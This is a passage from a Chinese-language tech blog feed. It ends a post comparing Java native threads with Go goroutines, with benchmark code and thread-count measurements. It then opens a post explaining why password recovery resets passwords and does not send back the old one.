另外你可以在啟動 Java 時用 -Xss 指令指定 thread 佔用的記憶體大小，但實際上太小也會導致 Jvm 無法啟動。像我的筆電指定記憶體小於 135k 就會出錯。&lt;/li&gt;
&lt;li&gt;創建 thread 和 Context Switch 的開銷&lt;br&gt;
當 thread 數量超過 core 數量的時候，OS 會透過排程盡可能讓每個 thread 都能公平的佔用 core，而 core 把執行到一半的 thread 狀態存起來，切換到另一個 thread 執行就是 Context Switch。&lt;br&gt;
context switch 本身也是會佔用 core 運算資源的。當 thread 數量過多時，會造成 core 花在創建/銷毀 thread 和 Context Switch上的比例變多，變相減少 throughput。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下這是一段段用 ExecutorService 的 thread pool 執行 200000 次 doSomething function 的 java code，用來實驗 thread 的開銷有多昂貴：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Random&lt;/span&gt; random &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; anInt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; random&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;nextInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; threadNum &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;ExecutorService&lt;/span&gt; executorService &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Executors&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newFixedThreadPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;threadNum&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;200000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;awaitTermination&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Long&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;MAX_VALUE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;NANOSECONDS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我嘗試把 thread poll 的 thread 數量從 100~9000 去執行，去比較執行時間：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到使用越多 thread 數量越高反而執行時間越久。試著 profile 程式可以看到當 thread num 為 100 時，cpu 花在 &lt;em&gt;doSomething 的時間佔比約為 51%，如下：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而當 thread num 為 9900 時，&lt;strong&gt;&lt;em&gt;doSomething&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;的 cpu 佔用時間比例驟降到 27%。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;種種跡象都告訴我們，thread 昂貴的開銷，讓 Java 在高併發的場景是略顯無力的。&lt;/p&gt;
&lt;h1 id=&quot;goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F&quot;&gt;#&lt;/a&gt; Goroutine 怎麼做？&lt;/h1&gt;
&lt;p&gt;相較 Java 使用 native thread，依賴 OS 原生的 scheduler 去調度，goroutine 實作自己的 scheduler，自行調度 goroutinue 在固定的 thread 間執行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Thread 大約每執行一個 goroutine 10ms 就會切換到另一個 thread。而 thread 挑選 goroutine 的優先順序為&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;每個 thread 各自的 queue 中的 goroutine&lt;/li&gt;
&lt;li&gt;global queue 中的 goroutine&lt;/li&gt;
&lt;li&gt;從其他 thread 的 queue 竊取 (work-stealing)&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Golang 用 GOMAXPROCS 這參數決定 gouroutine 使用多少 thread，預設是 core 數量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;實際看一下在 linux 上跑 goroutine 的 thread 數量，下面是執行的 golang code:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Minute&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;	time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Minute&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;實際在我的開發環境觀察 thread 數量都在 4~6 左右。&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;**g7@g7test1**:**~**$ &lt;span class=&quot;token function&quot;&gt;ps&lt;/span&gt; -T &lt;span class=&quot;token number&quot;&gt;1013506&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wc&lt;/span&gt; -l&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94&quot;&gt;#&lt;/a&gt; Goroutine 的記憶體&lt;/h2&gt;
&lt;p&gt;一開始創建 goroutine 時會先分配 4k 的記憶體，隨著 goroutine 使用量會動態擴展。相較 Java 的 thread 模型，golang 會比較難被記憶體大小限制著上限。&lt;/p&gt;
&lt;h2 id=&quot;blocking-system-call&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#blocking-system-call&quot;&gt;#&lt;/a&gt; Blocking System Call&lt;/h2&gt;
&lt;p&gt;目前為止看起來很美好，但如果 thread 被 blocking system call 卡住呢 (ex. 讀大檔案)？例如下圖有三個 goroutine 透過 io system call 讀大檔案，此時會導致全部的 goroutinue 只依賴一個 thread 執行，大幅減少 core 的利用率。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;為了解決這問題，golang 在 thread 和 goroutine 間再隔一層 process 如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而當有 thread 被 system call block 住時，golang 會另外創建新的 thread 接手該 processor 的工作，而原本的 thread 則繼續執行 system call。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;實際用下面的 code，開 1000 個 goroutine 讀大檔案測試：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readBigFile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	fi&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; os&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;bigfile&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; fi&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	buf &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		n&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; fi&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;EOF &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; n &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;readBigFile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;	time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; time&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Minute&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跑起來以後觀察該程式啟動的 thread 會增加到 1xx：&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;**g7@g7test1**:**~**$ &lt;span class=&quot;token function&quot;&gt;ps&lt;/span&gt; -T &lt;span class=&quot;token number&quot;&gt;1013506&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wc&lt;/span&gt; -l&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token number&quot;&gt;142&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由此我們也可以知道，當 Golang 頻繁開 goroutine 去 call blocking system call 時，其併發量可能會退化到 Java 使用 native thread 一樣。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你想更深入了解 goroutine scheduler，可以參考 &lt;a href=&quot;https://www.youtube.com/watch?v=-K11rY57K7k&amp;amp;t=316s&amp;amp;ab_channel=Hydra&quot;&gt;Go scheduler: Implementing language with lightweight concurrency&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h1&gt;
&lt;p&gt;目前為止我們討論了 Java 如何實現併發和面臨的問題，以及 goroutine 如何在解決這些問題。但這不代表 Java 對高併發束手無策。&lt;/p&gt;
&lt;p&gt;實際上目前 Java 有個 &lt;a href=&quot;https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads&quot;&gt;Loom Project&lt;/a&gt;，就是要在 JVM 上實作類似 goroutine 機制的 virtual thread。或許在下一個 Java 的 LTS 版本，我們就能在 Java 上感受 Goroutine 輕巧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;題外話，我個人覺得比較有趣的點是 Java 1.2 前 Java 的 thread 設計其實跟 goroutine 很像，是在 OS thread 上跑 Java thread，但在多核心的環境遇到一些效能問題才在 Java 1.3 以後改為使用 native thread。但隨著時代演進，Java 又要改回在 thread 上跑 thread 的設計。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;讓我不禁想：會不會未來有一天 OS 有原生類似 goroutine 的機制以後，各大語言又會又轉而改使用 OS 原生的併發機制呢，而不使用自己實作的 scheduler 呢？&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>為什麼忘記密碼時只能重設，不把舊密碼告訴我？</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/"/>
		<updated>2021-07-09T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/</id>
		<content type="html">
		  &lt;p&gt;某天小明在整理他的我的最愛（到底誰的），發現了一個以前很常逛，但已經將近半年多沒去的一個論壇。小明想回去看看那邊變得怎麼樣了，於是點進去那個論壇，輸入了帳號密碼，得到了密碼錯誤的回覆。&lt;/p&gt;
&lt;p&gt;嘗試了幾次之後，系統提示小明可以使用「忘記密碼」的功能，所以小明填了自己的 email 之後去信箱收信，發現系統傳來一個「重設密碼」的連結。雖然說最後小明成功利用重新設定的密碼登入，但有個問題讓他百思不得其解：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「奇怪欸，幹嘛要我重設密碼，為什麼不把舊的密碼寄給我就好？」&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;p&gt;應該有許多人都跟小明一樣，有過類似的疑惑。把舊密碼寄給我不是很好嗎，幹嘛強迫我換密碼？&lt;/p&gt;
&lt;p&gt;這一個看似簡單的問題，背後其實藏了許多資訊安全相關的概念，就讓我們慢慢尋找問題的答案，順便學習一些基本的資安知識吧！&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;先提醒一下，雖然說前半段看起來可能跟文章主題無關，但好酒沉甕底，我保證最後會把這些東西關聯起來。&lt;/p&gt;
&lt;h2 id=&quot;%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB&quot;&gt;#&lt;/a&gt; 被偷走的資料庫&lt;/h2&gt;
&lt;p&gt;大家應該很常看到新聞說哪個網站的資料又被偷走了，顧客個資全部都外洩出去。例如說&lt;a href=&quot;https://tw.news.yahoo.com/%E5%80%8B%E8%B3%87%E9%81%AD%E6%B4%A9-%E9%BA%A5%E7%95%B6%E5%8B%9E%E8%81%B2%E6%98%8E-%E4%B8%8D%E5%90%AB%E4%BB%98%E6%AC%BE%E8%B3%87%E6%96%99-103012207.html&quot;&gt;麥當勞&lt;/a&gt;在近期就發生了類似的事件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/reset-password/p1.png&quot; alt=&quot;麥當勞資料外洩的通知信&quot;&gt;&lt;/p&gt;
&lt;p&gt;這邊我想帶大家探討的兩個問題是：&lt;/p&gt;
&lt;ol&gt;
